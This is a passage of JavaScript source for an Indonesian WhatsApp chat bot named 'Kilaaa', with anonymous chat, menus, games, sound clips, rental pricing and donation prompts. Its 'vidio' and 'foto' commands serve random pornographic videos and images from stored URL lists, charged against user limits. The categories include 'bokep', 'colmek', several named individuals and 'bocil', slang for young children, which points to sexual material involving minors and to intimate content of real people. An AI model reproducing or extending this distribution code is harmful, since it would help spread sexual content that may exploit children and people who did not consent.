                if (other) await dica.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await dica.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, dica.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await dica.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, dica.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await dica.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, dica.user.name, m)
                }
                break
            }
            case 'public': {
                if (!itsMeDica) throw mess.owner
                dica.public = true
                m.reply('*Sukse Change To Public Usage*')
            }
            break
            case 'self': {
                if (!itsMeDica) throw mess.owner
                dica.public = false
                m.reply('*Sukses Change To Self Usage*')
            }
            break

            case 'owner': case 'creator': {
            	dica_dev = await getBuffer(`https://cahyacc.github.io/media/audio/owndica.mp3`)
                dica.sendContact(m.chat, global.owner, m);
                await dica.sendMessage(m.chat, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true });
            }
            break
            
            break
//INI FITUR REQUEST YA ADICK"//
case 'req': case 'request': {
            	if (!text) throw `Contoh : ${prefix + command} Fitur Min`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Pesan Dari : @${me.split('@')[0]} \nUntuk : @${ownernya.split('@')[0]}\n\n${command} ${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: 'MENU' }, type: 1 },{ buttonId: 'DONASI', buttonText: { displayText: 'DONASI' }, type: 1 }]
            await dica.sendButtonText(ownernya, buttons, pjtxt, nyoutube, m, {mentions: ments, quoted: m })
            let akhji = `*Request Telah Terkirim*\n*Ke Owner @${ownernya.split('@')[0]}*`
            await dica.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments, quoted: m })
            }
            break
case 'reeport': {
if (!args.join(" ")) return m.reply(`Contoh : \n- ${prefix + command} fitur ig error min\n- ${prefix + command} user ini nyepam min`)
teks = `*| REPORT FITUR |*`
teks1 = `\n\nNomor : @${m.sender.split("@")[0]}\nReport : ${args.join(" ")}`
teks2 = `\n\nSucces send to owner`
for (let i of owner) {
dica.sendMessage(i + "@s.whatsapp.net", {text: teks + teks1, mentions:[m.sender]}, {quoted:m})
}
dica.sendMessage(m.chat, {text: teks + teks2 + teks1, mentions:[m.sender]}, {quoted:m})
}
break


case 'rules': {
dica_dev = await getBuffer(`https://cahyacc.github.io/media/audio/intro.mp3`)
rules = `*Rules BOT*

Kilaaa merupakan sebuah Robot WhatsApp yang diprogram untuk melakukan perintah tertentu secara otomatis.
Setiap respon atau balasan yang dilakukan oleh bot bukan dari Manusia.

Dengan memakai bot ini maka kamu *setuju* dengan syarat dan kondisi sbg berikut:
-Beri jeda dari setiap memakai fitur.
-Dilarang Keras Spamming Bot.
-Kami tidak menyimpan gambar, video, file, audio, dan dokumen dari anda
-Kami sama sekali tidak menyimpan data pribadi kamu di server.
-Kami tidak bertanggung jawab atas perintah kamu kepada bot ini.


`
let buttons = [{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'sewa', buttonText: { displayText: '👑Sewa' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, rules, nyoutube, m, {quoted: fkontak})
            await dica.sendMessage(m.chat, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
            }
            break 
case 'simplemenu': case 'help': {
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let ments = [ownernya, me, ini_mark]
            let kukiw = `Hai *Kak ${pushname}*`
                let sections = [
                {
	           title: ' ∫ » Sewa Bot? –––––––·│⭔',
	           rows: [
	            {title: "〽️ │⭔ Sewa", rowId: `listsewa`, description: `KLIK UNTUK SEWA BOT`},
                {title: "📴 │⭔ Owner", rowId: `owner`, description: `KLIK UNTUK BERTANYA KEPADA OWNER`},
                {title: "🔞│⭔Asupan", rowId: `asupan`, description: `DOSA TANGGUNG SENDIRI`}
	            ]
                },{
                title: "⚠︎  ∫ » CHANGE MENU BOT « ✧",
                rows: [
                {title: "➵  「 Group 」", rowId: `mgroup`, description: `╰ ► 👥Fitur Buat Grup, Tapi Hati Hati Admin :v`},
                {title: "➵  「 Webzone 」", rowId: `mwebzone`, description: `╰ ► 📹Cari Film? Sini Tempatnya 🤫`},
                {title: "➵  「 Downloader 」", rowId: `mdownloader`, description: `╰ ► 📥Buat Download Apaan? 🤨`},
                {title: "➵  「 Search 」", rowId: `msearch`, description: `╰ ► 🔍Cari Apa Hayo`},
                {title: "➵  「 Random 」", rowId: `mrandom`, description: `╰ ► ❔Random Moment🗿`},
                {title: "➵  「 Text Pro 」", rowId: `mtextpro`, description: `╰ ► ❇Teksnya Keren Kan?`},
                {title: "➵  「 Fun 」", rowId: `mfun`, description: `╰ ► 🔫Buat Fun² Bro`},
                {title: "➵  「 Voice 」", rowId: `mvoice`, description: `╰ ► 🎶Req Lagu Apa Ngab?`},
                {title: "➵  「 Owner 」", rowId: `mowner`, description: `╰ ► 🎟Ini fitur kusus Owner Kilaa`}
                ]
                },{
	           title: ' ∫ » SUPPORT ME –––––––·│⭔',
	           rows: [
	            {title: "🎟 │⭔ Donasi", rowId: `donasi`, description: `╰ ► 💰 Donasi ♕︎`}
	]
  },
]
                dica.sendListMsg(m.chat, kukiw, nyoutube, `*${ucapanWaktu}*`, `Touch Me (⁠≧⁠▽⁠≦⁠)`, sections, m)
            }
            break
        //menu simple video bokep
case 'vidio':
case 'vid': 
case 'video': 
case 'pidio':
case 'pideo': {
                if (!text) throw `Contoh : ${prefix + command} asupan.ꫂ\n\nOption : \n1. bokep.ꫂ\n2. colmek.ꫂ\n3. ghea.ꫂ\n4. ukhty.ꫂ\n5. notnot.ꫂ\n6. rika.ꫂ\n7. kayes.ꫂ\n8. santuy.ꫂ\n9. bocil.ꫂ\n10. aviva.ꫂ\n11. angelchan.ꫂ`
              if (args[0] === "asupan") {
                m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));

  if (!isPremium && global.db.data.users[m.sender].limit < 20) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 20 

var asupan = JSON.parse(fs.readFileSync('./storage/asupan/video/asupan.json') )
var hasil = pickRandom(asupan)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, footer: mess.watermark }, { quoted: m })
                    
                } else if (args[0] === "bokep") {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));


  if (!isPremium && global.db.data.users[m.sender].limit < 20) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 20 

var bokep = JSON.parse(fs.readFileSync('./storage/asupan/video/bokep.json'))
var hasil = pickRandom(bokep)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, footer: mess.watermark }, { quoted: m })
                    
                } else if (args[0] === 'colmek') {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));

if (!isPremium && global.db.data.users[m.sender].limit < 20) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 20 

var clmk = JSON.parse(fs.readFileSync('./storage/asupan/video/clmk.json') )
var hasil = pickRandom(clmk)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, footer: mess.watermark }, { quoted: m })
                    
                } else if (args[0] === 'ghea') {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));

if (!isPremium && global.db.data.users[m.sender].limit < 20) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 20

var gheayubi = JSON.parse(fs.readFileSync('./storage/asupan/video/gheayubi.json'))
var hasil = pickRandom(gheayubi)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, footer: mess.watermark }, { quoted: m })

} else if (args[0] === 'ukhty') {
                   m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));

if (!isPremium && global.db.data.users[m.sender].limit < 20) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 20

var ukhty = JSON.parse(fs.readFileSync('./storage/asupan/video/ukhty.json'))
var hasil = pickRandom(ukhty)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, footer: mess.watermark }, { quoted: m })
                    
                } else if (args[0] === "notnot") {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply(mess.member)
  if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 

var notnot = JSON.parse(fs.readFileSync('./storage/asupan/video/asupannotnot.json') )
var hasil = pickRandom(notnot)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url },  footer: mess.watermark }, { quoted: m })
              
                } else if (args[0] === "rika") {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply(mess.member)
  if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 

var rika = JSON.parse(fs.readFileSync('./storage/asupan/video/rikagusriani.json') )
var hasil = pickRandom(rika)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url },  footer: mess.watermark }, { quoted: m })
                  
  } else if (args[0] === "kayes") {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply(mess.member)
  if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 

var kayes = JSON.parse(fs.readFileSync('./storage/asupan/video/kayes.json') )
var hasil = pickRandom(kayes)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url },  footer: mess.watermark }, { quoted: m })
                       
                } else if (args[0] === "santuy") {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply(mess.member)
  if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 

var santuy = JSON.parse(fs.readFileSync('./storage/asupan/video/santuy.json') )
var hasil = pickRandom(santuy)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url },  footer: mess.watermark }, { quoted: m })
                 
                } else if (args[0] === "angelchan") {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));

  if (!isPremium && global.db.data.users[m.sender].limit < 20) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 20

var angel = JSON.parse(fs.readFileSync('./storage/asupan/video/vidangelchan.json') )
var hasil = pickRandom(angel)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url },  footer: mess.watermark }, { quoted: m })
} else if (args[0] === "bocil") {
m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));

if (!isPremium && global.db.data.users[m.sender].limit < 20) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 20
var bocil = JSON.parse(fs.readFileSync('./storage/asupan/video/bocil.json'))
var hasil = pickRandom(bocil)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, footer: mess.watermark }, { quoted: m })

} else if (args[0] === "aviva") {
m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));

if (!isPremium && global.db.data.users[m.sender].limit < 20) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 20
var bocil = JSON.parse(fs.readFileSync('./storage/asupan/video/aviva.json'))
var hasil = pickRandom(bocil)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, footer: mess.watermark }, { quoted: m })
            }
           }
           
break;


//menu simple foto bokep


case 'foto':
case 'pict': 
case 'poto': 
case 'pictur':{
                if (!text) throw `Contoh : ${prefix + command} asupan.ꫂ\n\nOption : \n1. angelchan.ꫂ\n2. aviva.ꫂ\n3. bocil.ꫂ\n4. ukhty.ꫂ`
                if (args[0] === "asupan") {
                m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));

  if (!isPremium && global.db.data.users[m.sender].limit < 20) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 20

var asupan = JSON.parse(fs.readFileSync('./storage/asupan/foto/pasupan.json') )
var hasil = pickRandom(asupan)
dica.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, footer: mess.watermark }, { quoted: m })
                    
                } else if (args[0] === "aviva") {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply(mess.member)

  if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 

var bokep = JSON.parse(fs.readFileSync('./storage/asupan/foto/aviva.json'))
var hasil = pickRandom(bokep)
dica.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, footer: mess.watermark }, { quoted: m })
                    
                } else if (args[0] === 'angelchan') {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));

if (!isPremium && global.db.data.users[m.sender].limit < 20) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 20

var clmk = JSON.parse(fs.readFileSync('./storage/asupan/foto/angel-chan.json') )
var hasil = pickRandom(clmk)
dica.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, footer: mess.watermark }, { quoted: m })
                    
                } else if (args[0] === 'bocil') {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply(mess.member)

if (!isPremium && global.db.data.users[m.sender].limit < 20) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 20

var gheayubi = JSON.parse(fs.readFileSync('./storage/asupan/foto/pbocil.json'))
var hasil = pickRandom(gheayubi)
dica.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, footer: mess.watermark }, { quoted: m })

/**} else if (args[0] === 'ukhty') {
                   m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply('Khusus Member Group Gw Coy\nJoin Sini https:/\/chat.whatsapp.com/FaJ97A5oS4w2aZ1J9wf35y')

if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 

var ukhty = JSON.parse(fs.readFileSync('./storage/asupan/video/ukhty.json'))
var hasil = pickRandom(ukhty)
dica.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, footer: mess.watermark }, { quoted: m })
                    
                } else if (args[0] === "notnot") {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply('Khusus Member Group Gw Coy\nJoin Sini https:/\/chat.whatsapp.com/FaJ97A5oS4w2aZ1J9wf35y')
  if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 

var notnot = JSON.parse(fs.readFileSync('./storage/asupan/video/asupannotnot.json') )
var hasil = pickRandom(notnot)
dica.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url },  footer: mess.watermark }, { quoted: m })
              
                } else if (args[0] === "rika") {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply('Khusus Member Group Gw Coy\nJoin Sini https:/\/chat.whatsapp.com/FaJ97A5oS4w2aZ1J9wf35y')
  if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 

var rika = JSON.parse(fs.readFileSync('./storage/asupan/video/rikagusriani.json') )
var hasil = pickRandom(rika)
dica.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url },  footer: mess.watermark }, { quoted: m })
                  
  } else if (args[0] === "kayes") {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply('Khusus Member Group Gw Coy\nJoin Sini https:/\/chat.whatsapp.com/FaJ97A5oS4w2aZ1J9wf35y')
  if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 

var kayes = JSON.parse(fs.readFileSync('./storage/asupan/video/kayes.json') )
var hasil = pickRandom(kayes)
dica.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url },  footer: mess.watermark }, { quoted: m })
                       
                } else if (args[0] === "santuy") {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply('Khusus Member Group Gw Coy\nJoin Sini https:/\/chat.whatsapp.com/FaJ97A5oS4w2aZ1J9wf35y')
  if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 

var santuy = JSON.parse(fs.readFileSync('./storage/asupan/video/santuy.json') )
var hasil = pickRandom(santuy)
dica.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url },  footer: mess.watermark }, { quoted: m })
                 
                } else if (args[0] === "angelchan") {
                    m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply('Khusus Member Group Gw Coy\nJoin Sini https:/\/chat.whatsapp.com/FaJ97A5oS4w2aZ1J9wf35y')
  if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 

var angel = JSON.parse(fs.readFileSync('./storage/asupan/video/vidangelchan.json') )
var hasil = pickRandom(angel)
dica.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url },  footer: mess.watermark }, { quoted: m })
} else if (args[0] === "bocil") {
m.reply(mess.wait)
await new Promise(resolve => setTimeout(resolve, 5000));
if (!m.isGroup) return m.reply('Khusus Member Group Gw Coy\nJoin Sini https:/\/chat.whatsapp.com/FaJ97A5oS4w2aZ1J9wf35y')
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
var bocil = JSON.parse(fs.readFileSync('./storage/asupan/video/bocil.json'))
var hasil = pickRandom(bocil)
dica.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, footer: mess.watermark }, { quoted: m })
**/
               }
             }
           
 break


//batas
case 'gamemenu':{
  // send a list message!
   const sections = [
    {
	title: "Game 1",
	rows: [
	   {
	    title: "Tebak Gambar", 
	    rowId: `${prefix}tebakgambar`,
	   },	    
     ]
    },
    {
	title: "Game 2",
	rows: [
	   {
	    title: "Tebak Lirik", 
	    rowId: `${prefix}tebak lirik`,
	   },	    
     ]
    },
    {
	title: "Game 3",
	rows: [
	   {
	    title: "tictactoe", 
	    rowId: `${prefix}tictactoe`,
	   },	    
     ]
    },
    {
	title: "Game 4",
	rows: [
	   {
	    title: "Tebak Kata", 
	    rowId: `${prefix}tebak kata`,
	   },	    
     ]
    },
    {
	title: "Game 5",
	rows: [
	   {
	    title: "Tebak Lontong", 
	    rowId: `${prefix}tebak lontong`,
	   },	    
     ]
    },
    {
	title: "Game 6",
	rows: [
	   {
	    title: "Tebak Lagu", 
	    rowId: `${prefix}tebak lagu`,
      },	    
     ]
    },
    {
	title: "Game 7",
	rows: [
	   {
	    title: "Tebak Kalimat", 
	    rowId: `${prefix}tebak kalimat`,
      },	    
     ]
    },
    {
	title: "Game 8",
	rows: [
	   {
	    title: "Suit PvP", 
	    rowId: `${prefix}suitpvp`,
	    description: "",
	   },	    
     ]
    }     
    ]

  const listMessage = {
   text: `*_Hai kak ${pushname} ${ucapanWaktu}_*\n\n_Berikut Game" Yang Tersedia Di Kilaaa_`,
   footer: "Kilaaa",
   title: "",
   buttonText: "Buka!",
   sections
   }

  dica.sendMessage(m.chat, listMessage, {quoted:m})


  }
break

case 'sc':  case 'script': {
            	dica_dev = await getBuffer(`https://cahyacc.github.io/media/audio/ketawasc.mp3`)
            dica_dev1 = await getBuffer(`https://cahyacc.github.io/media/audio/ketawakila.mp3`)
            dica_dev2 = await getBuffer(`https://cahyacc.github.io/media/audio/aku-ngakak.mp3`)
            await dica.sendMessage(m.chat, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                await new Promise(resolve => setTimeout(resolve, 3000));
                await dica.sendMessage(m.chat, { audio: dica_dev1, mimetype: 'audio/mp4', ptt: true })
                await new Promise(resolve => setTimeout(resolve, 5000));
                await dica.sendMessage(m.chat, { audio: dica_dev2, mimetype: 'audio/mp4', ptt: true })
            kilaa = `
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
Ready Sc Bot 100% No enc + Support Run Panel On 24 Jam
Untuk Harga Bisa pm
▬▭▬▭▬▭▬▭▬▭▬▭▬`
let buttons = [{ buttonId: 'listsewa', buttonText: { displayText: '𝐒𝐄𝐖𝐀' }, type: 1 }]
await dica.sendButtonText(m.chat, buttons, kilaa, nyoutube, m, {quoted: m})
            }
            break		 
            
case 'listsewa': 
case 'sewa':
case 'buypremium': 
case 'buylimit':
case 'belilimit':{
kilaa = `
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
                    𝐒𝐄𝐖𝐀
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
【♡ۣۜۜ፝͜͜͡͡✿➣  1 MINGGU = 5K
【♡ۣۜۜ፝͜͜͡͡✿➣  1 BULAN = 10K
【♡ۣۜۜ፝͜͜͡͡✿➣  3 BULAN = 20K
【♡ۣۜۜ፝͜͜͡͡✿➣  PERMANEN = 25K
▬▭▬▭▬▭▬▭▬▭▬▭▬`
let buttons = [{ buttonId: 'owner', buttonText: { displayText: '👥OWNER' }, type: 1 }]
await dica.sendButtonText(m.chat, buttons, kilaa, nyoutube, m, {quoted: m})
            }
break

case 'donasi': case 'donate': case 'donasi': case 'donasi': {
                dica_dev = await getBuffer(`https://cahyacc.github.io/media/audio/makasih.mp3`)   
dica.sendMessage(m.chat, { image: fs.readFileSync('./media/donasi.jpg'), caption: `*HAI KAK  ${m.pushName}*
┏━━━━━━⬣ 
┃Mari berdonasi bersama kami
┃untuk meringankan user beban
┃ᴮᵃᵍⁱ ᴬⁿᵈᵃ ʸᵃⁿᵍ ᵐᵉᵐⁱˡⁱᵏⁱ ˢᵃˡᵈᵒ ˡᵉᵇⁱʰ
┃ᵇⁱˢᵃ ᵈⁱ ᵈᵒⁿᵃˢⁱᵏᵃⁿ ᵐᵉˡᵃˡᵘⁱ ᵇᵉʳⁱᵏᵘᵗ ⁱⁿⁱ
┃                 *𝙑 𝙄 𝘼*
┃*Gopay Dana Ovo ShopeePay*
┃ Ke nomer berikut 
┃: [ 0812-3899-6370 ]
┃_Terima kasih_
┃*Silahkan Chat Owner*
┃Untuk akses premium
┃_https:/\/wa.me/6281238996370_
┗⬣
𝐃𝐞𝐧𝐠𝐚𝐧 𝐛𝐚𝐧𝐭𝐮𝐚𝐧 𝐝𝐨𝐧𝐚𝐬𝐢 𝐤𝐚𝐥𝐢𝐚𝐧 𝐀𝐤𝐚𝐧 𝐦𝐞𝐦𝐛𝐮𝐚𝐭 𝐛𝐨𝐭 𝐦𝐞𝐧𝐣𝐚𝐝𝐢 𝐨𝐧𝐥𝐢𝐧𝐞 𝟐𝟒𝐣𝐚𝐦 𝐭𝐞𝐫𝐮𝐬 
𝐃𝐚𝐧 𝐬𝐢𝐬𝐚𝐡𝐧𝐲𝐚 𝐚𝐤𝐚𝐧 𝐝𝐢 𝐬𝐢𝐦𝐩𝐚𝐧 𝐛𝐮𝐚𝐭 𝐤𝐞𝐛𝐮𝐭𝐮𝐡𝐚𝐧 𝐛𝐨𝐭 𝐤𝐢𝐥𝐚 𝐢𝐧𝐢

_Please I need your donations😔🙏_` }, m, { quoted: m })
await new Promise(resolve => setTimeout(resolve, 5000));
await dica.sendMessage(m.chat, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true }) 
            }
            break
case 'sewabot':{
let sections = [

                {

                title: "✧──────[ SEWABOT ]──────✧",

                rows: [

                {title: "👥OWNER", rowId: `${prefix}owner`, description: ``},
                
                {title: "🛒STORE", rowId: `store`, description: ``},

                ]

                },

                ]

                dica.sendListMsg(m.chat, `*────── 「 SEWA BOT 」 ──────*
                
𝐥𝐢𝐬𝐭 𝐬𝐞𝐰𝐚 𝐤𝐚𝐦𝐢 𝐬𝐢𝐥𝐚𝐡𝐤𝐚𝐧 𝐝𝐢𝐩𝐢𝐥𝐢𝐡
• 1 Minggu 5k
• 1 Bulan 10k
┗━━━•❅•°•❈`, ' ', ' ', `Lihat!`, sections, m)
       }
break
            //Ga penting
case 'bokep': {
	m.reply(`Contoh Penggunaan\n\nVideo/foto ${prefix + command}`)
}
break
case 'colmek': {
     m.reply(`Contoh Penggunaan\n\nVideo/foto ${prefix + command}`)
}
break
case 'ghea': {
	m.reply(`Contoh Penggunaan\n\nVideo/foto ${prefix + command}`)
}
break
case 'ukhty': {
	m.reply(`Contoh Penggunaan\n\nVideo/foto ${prefix + command}`)
}
break
case 'notnot': {
	m.reply(`Contoh Penggunaan\n\nVideo/foto ${prefix + command}`)
}
break	
case 'rika': {
	m.reply(`Contoh Penggunaan\n\nVideo/foto ${prefix + command}`)
}
break
case 'kayes': {
	m.reply(`Contoh Penggunaan\n\nVideo/foto ${prefix + command}`)
}
break
case 'santuy': {
	m.reply(`Contoh Penggunaan\n\nVideo/foto ${prefix + command}`)
}
case 'bocil': {
	m.reply(`Contoh Penggunaan\n\nVideo/foto ${prefix + command}`)
}
break
case 'angelchan': {
	m.reply(`Contoh Penggunaan\n\nVideo/foto ${prefix + command}`)
}
break
            
            case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
dica_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await dica.sendMessage(m.chat, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'acumalaka':
case 'aku-ngakak':
case 'anjay':
case 'ara-ara-cowok':
case 'ara-ara':
case 'ara-ara2':
case 'arigatou':
case 'assalamualaikum':
case 'asu':
case 'ayank':
case 'bacot':
case 'bahagia-aku':
case 'baka':
case 'bansos':
case 'beat-box':
case 'beat-box2':
case 'biasalah':
case 'bidadari':
case 'bot':
case 'buka-pintu':
case 'canda-anjing':
case 'cepetan':
case 'china':
case 'cuekin-terus':
case 'daisuki-dayo':
case 'daisuki':
case 'dengan-mu':
case 'farhan-kebab':
case 'gaboleh-gitu':
case 'gak-lucu':
case 'gamau':
case 'gay':
case 'gelay':
case 'gitar':
